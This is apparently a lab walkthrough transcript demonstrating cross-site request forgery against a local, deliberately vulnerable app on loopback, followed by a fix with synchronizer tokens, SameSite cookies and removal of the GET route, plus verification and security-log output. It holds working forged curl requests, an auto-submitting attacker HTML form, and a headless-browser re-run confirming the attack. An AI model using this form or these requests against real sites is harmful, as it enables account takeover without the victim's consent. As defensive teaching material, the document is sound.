=== b-csrf walkthrough transcript ===
date: 2026-10-09  python: Python 3.12.3  curl: curl 8.5.0 (x86_64-pc-linux-gnu) libcurl/8.5.0 OpenSSL/3.0.13 zlib/1.3 brotli/1.1.0 zstd/1.5.5 libidn2/2.3.7 libpsl/0.21.2 (+libidn2/2.3.7) libssh/0.10.6/openssl/zlib nghttp2/1.59.0 librtmp/2.3 OpenLDAP/2.6.10
env: loopback only, no Docker on this machine (labeled local demo)

--- step 1: start vulnerable app, log in as victim ---
csrf demo on 127.0.0.1:8327 FIXED=False
$ curl -c jar -X POST localhost:8327/login
logged in; csrf_token=f7870688523ee0759283ad97dcb9d5425314e432428aba93c396e99259abb927

--- step 2: baseline (legitimate email change) ---
$ curl -b jar -d 'email=victim@example.com' localhost:8327/change-email
email changed to victim@example.com
$ curl -b jar localhost:8327/whoami
victim@example.com

--- step 3: server-side proof (forged-shaped request: cookie, no token, no Referer/Origin) ---
$ curl -b jar -d 'email=attacker@evil.example' localhost:8327/change-email
email changed to attacker@evil.example
attacker@evil.example

--- step 4: the attacker's page (local HTML; the request it fires == step 3) ---
<html><body>
<form action="http://127.0.0.1:8327/change-email" method="POST">
<input type="hidden" name="email" value="attacker@evil.example">
</form>
<script>document.forms[0].submit();</script>
</body></html>
(No live browser on this machine: the form above submits exactly the
 step-3 request shape -- cookie auto-attached, no token. The reader
 confirms it in their own browser against their own lab account.)

--- step 5: the state-changing GET (one URL, no form) ---
$ curl -b jar 'localhost:8327/change-email-get?email=attacker2@evil.example'
(the -b jar stands in for the browser auto-attaching the session cookie)
email changed to attacker2@evil.example
attacker2@evil.example

--- step 6: apply fix (synchronizer tokens + no GET + SameSite=Lax) ---
csrf demo on 127.0.0.1:8327 FIXED=True
$ curl -c jar -X POST localhost:8327/login  (observe SameSite in Set-Cookie)
Set-Cookie: session=1f2da7cd15690cfd1b6f76db658e6ae4; Path=/; HttpOnly; SameSite=Lax

--- step 7: verify fix, four cases ---
[forged: no token] ->
403
[forged: wrong token] ->
403
[legit: fetch form, extract token, submit] ->
token extracted: bf3efa761c135ec6... (length 64)
email changed to victim@example.com
victim@example.com
[GET variant removed] ->
404

--- step 8: defender view (security log) ---
[vulnerable run]
EMAIL-CHANGE to victim@example.com (mode=vuln)
EMAIL-CHANGE to attacker@evil.example (mode=vuln)
EMAIL-CHANGE to victim@example.com (mode=vuln)
EMAIL-CHANGE via GET to attacker2@evil.example
[fixed run]
CSRF-REJECT path=/change-email token=missing
CSRF-REJECT path=/change-email token=mismatch
EMAIL-CHANGE to victim@example.com (mode=fixed)

=== end transcript ===

--- RE-RUN 2026-10-10: step 4 attacker's page — RAN ---
browser: Playwright headless Chromium. Demo: fresh csrf app.py (same
login/cookie-session/vulnerable POST /change-email behavior), loopback only.
Logged in as victim in the browser context (victim@example.com), then opened
the attacker's auto-submitting form page (file:// evil.html, posts to the
local app) in the same context:
  victim email before: victim@example.com
  victim email after evil.html: attacker@evil.example
The browser attached the victim's cookie to the forged POST; the server
changed the email. The click-step is now run by us, for real.
